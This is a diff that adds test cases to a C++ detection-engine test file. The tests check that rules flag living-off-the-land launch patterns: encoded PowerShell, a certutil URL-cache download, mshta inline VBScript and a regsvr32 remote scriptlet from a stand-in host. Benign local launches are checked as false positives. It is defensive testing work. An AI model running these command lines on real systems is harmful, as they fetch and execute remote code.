@@ -34,6 +34,10 @@ int main(int argc,char** argv) {
     check(has(variants.consume(start(1,11,"powershell.exe","powershell -ec VABFAFMAVAA=")),"RS-002"),"-ec alias");
     check(has(variants.consume(start(2,12,"pwsh.exe","pwsh /enc VABFAFMAVAA=")),"RS-002"),"slash switch");
     check(has(variants.consume(start(3,13,"certutil.exe","certutil /urlcache /f http://x.test/a a")),"RS-005"),"certutil slash switch");
+    check(has(variants.consume(start(4,14,"mshta.exe","mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\")\")")),"RS-011"),"mshta inline script");
+    check(has(variants.consume(start(5,15,"regsvr32.exe","regsvr32 /s /n /u /i:https://x.test/a.sct scrobj.dll")),"RS-012"),"regsvr32 scriptlet");
+    Engine local_registration(rules);
+    check(local_registration.consume(start(1,20,"regsvr32.exe","regsvr32 /s C:\\Program Files\\App\\app.dll")).empty(),"local dll registration");
     Engine false_positives(rules);
     check(false_positives.consume(start(1,1,"powershell.exe","powershell -File C:\\scripts\\-encodedcommand.ps1")).empty(),"switch token boundary");
     check(false_positives.consume(start(2,2,"mshta.exe","mshta C:\\local.hta")).empty(),"local hta");
